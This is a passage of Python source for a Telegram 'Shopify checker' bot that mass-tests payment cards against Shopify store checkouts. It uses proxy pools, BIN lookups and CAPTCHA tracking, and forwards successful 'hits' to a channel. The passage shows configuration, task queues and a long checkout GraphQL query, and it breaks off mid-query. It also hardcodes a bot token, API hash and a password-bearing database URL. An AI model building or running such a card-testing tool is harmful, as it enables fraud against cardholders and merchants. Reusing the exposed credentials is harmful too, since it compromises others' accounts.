import asyncio
import aiohttp
import json
import html
import re
import random
import argparse
from urllib.parse import urlparse
from pyrogram import Client, filters, types
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.enums import ParseMode
import os
import time
from datetime import datetime, timedelta, timezone
import threading
from queue import Queue, Empty
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
from typing import Optional, Dict, List, Tuple, Any
import hashlib
import aiofiles
from motor.motor_asyncio import AsyncIOMotorClient
from pymongo import MongoClient
from bson import ObjectId
from collections import defaultdict, deque


import nest_asyncio
nest_asyncio.apply()

# Configuration
BOT_TOKEN = "8435065448:AAF3deY52T_TRETXKPgZnqOaqyfHXzUVlZ4"
API_ID = 23933044
API_HASH = "6df11147cbec7d62a323f0f498c8c03a"
ADMINS = [7125341830]
MONGO_URL = os.getenv(
    "MONGO_URL",
    "mongodb+srv://animepahe:animepahe@animepahe.o8zgy.mongodb.net/?retryWrites=true&w=majority"
)
HIT_CHANNEL = -1003805693108  # Channel for forwarding hits

# Constants
MAX_SITES_PER_USER = 500
MAX_GLOBAL_SITES = 500
MIN_SITE_PRODUCT_PRICE = 1.00
MAX_SITE_PRODUCT_PRICE = 26.00
WORKER_COUNT = min(int(os.getenv("WORKER_COUNT", "25")), 25)
PROXY_VALIDATION_URL = "https://httpbin.org/ip"
PROXY_VALIDATION_TIMEOUT = 6
PROXY_VALIDATION_CONCURRENCY = int(os.getenv("PROXY_VALIDATION_CONCURRENCY", "20"))
SITE_CHECK_WORKERS = min(int(os.getenv("SITE_CHECK_WORKERS", "5")), 5)
PRODUCT_CACHE_TTL_SECONDS = 300
BIN_CACHE_TTL_SECONDS = 86400
MAX_MASS_CHECK_CARDS = int(os.getenv("MAX_MASS_CHECK_CARDS", "50000"))
TASK_QUEUE_MAXSIZE = int(os.getenv("TASK_QUEUE_MAXSIZE", "20000"))
RESULT_QUEUE_MAXSIZE = int(os.getenv("RESULT_QUEUE_MAXSIZE", "20000"))
PROGRESS_UPDATE_EVERY = int(os.getenv("PROGRESS_UPDATE_EVERY", "25"))
PROGRESS_UPDATE_MIN_INTERVAL = float(os.getenv("PROGRESS_UPDATE_MIN_INTERVAL", "1.0"))
MAX_PENDING_TASKS_PER_USER = int(os.getenv("MAX_PENDING_TASKS_PER_USER", "50000"))
MAX_TOTAL_PENDING_TASKS = int(os.getenv("MAX_TOTAL_PENDING_TASKS", "250000"))
MCHK_LAST_RESPONSE_RETRIES = int(os.getenv("MCHK_LAST_RESPONSE_RETRIES", "2"))

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Initialize bot
app = Client(
    "shopify_checker_bot",
    bot_token=BOT_TOKEN,
    api_id=API_ID,
    api_hash=API_HASH
)

# MongoDB connection
client = AsyncIOMotorClient(MONGO_URL)
db = client['shopify_bot']
users_col = db['users']
proxies_col = db['proxies']
sites_col = db['sites']
user_sites_col = db['user_sites']
DB_AVAILABLE = True
DB_ERROR_REASON = None

# In-memory persistence fallback (used when MongoDB is unavailable)
mem_users = {}                  # user_id -> user dict
mem_user_proxies = defaultdict(set)   # user_id -> set(proxy)
mem_user_sites = defaultdict(list)    # user_id -> list(site_entry)
mem_global_sites = set()              # set(site_url)

# In-memory task tracking
active_tasks = {}  # legacy map kept for compatibility
active_task_counters = defaultdict(lambda: {'queued': 0, 'processing': 0})
task_stats = {}    # message_id -> task stats
task_messages = {} # message_id -> message object
task_users = {}    # message_id -> user_id
product_cache = {} # normalized_site -> {"data": product_info, "expires_at": epoch}
bin_cache = {}     # bin -> {"data": bin_info, "expires_at": epoch}
user_name_cache = {}  # user_id -> first_name
user_display_cache = {}  # user_id -> @username or first_name
mchk_pref_sessions = {}  # pref_id -> {user_id, choice, event, created_at}
mchk_captcha_pref_sessions = {}  # pref_id -> {user_id, choice, event, created_at}
user_active_mchk_batches = defaultdict(set)  # user_id -> set(batch_id)
mchk_batches = {}  # batch_id -> {user_id, msg_id, status, created_at}
cancelled_mchk_batches = set()  # batch_ids cancelled by /stopmchk
mchk_batch_captcha_cards = defaultdict(list)  # batch_id -> list of CAPTCHA_REQUIRED cc lines

# Global queues
TASK_QUEUE = asyncio.Queue(maxsize=TASK_QUEUE_MAXSIZE)
RESULT_QUEUE = asyncio.Queue(maxsize=RESULT_QUEUE_MAXSIZE)
active_workers = []
pending_user_tasks = defaultdict(deque)  # user_id -> deque[task]
pending_users_rr = deque()               # round-robin users
pending_users_set = set()                # fast membership for RR deque
pending_tasks_total = 0

# Placeholders for GraphQL queries (to be added manually)
# QUERY_PROPOSAL_SHIPPING
QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on 